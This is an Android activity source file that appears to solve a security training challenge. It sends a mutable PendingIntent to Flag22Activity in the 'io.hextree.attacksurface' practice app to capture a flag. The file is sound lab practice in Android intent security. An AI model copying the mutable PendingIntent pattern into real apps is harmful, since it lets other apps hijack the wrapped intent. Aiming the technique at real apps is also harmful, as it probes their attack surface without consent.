package niraj.patali.pendingintent;

import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;

import androidx.appcompat.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // Get the application context
        Context context = this;


        // Step 1: Create an Intent to target your app's activity (to handle when App Y calls pendingIntent.send)
        Intent targetIntent = new Intent(context, niraj.patali.pendingintent.TargetActivity.class);
        targetIntent.putExtra("anything", "something");

        // Step 2: Wrap the target Intent inside a PendingIntent
        PendingIntent pendingIntent = PendingIntent.getActivity(
                context,
                0,
                targetIntent,
                PendingIntent.FLAG_MUTABLE // Use MUTABLE to allow App Y to modify the intent
        );

        // Step 3: Create an Intent to send to the receiving app (App Y)
        Intent senderIntent = new Intent();
        senderIntent.setClassName(
                "io.hextree.attacksurface", // Package name of the receiving app
                "io.hextree.attacksurface.activities.Flag22Activity" // Fully qualified name of the activity in the receiving app
        );

        // Attach the PendingIntent to the Intent as an extra
        senderIntent.putExtra("PENDING", pendingIntent);

        // Start the activity in the receiving app
        try {
            context.startActivity(senderIntent);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
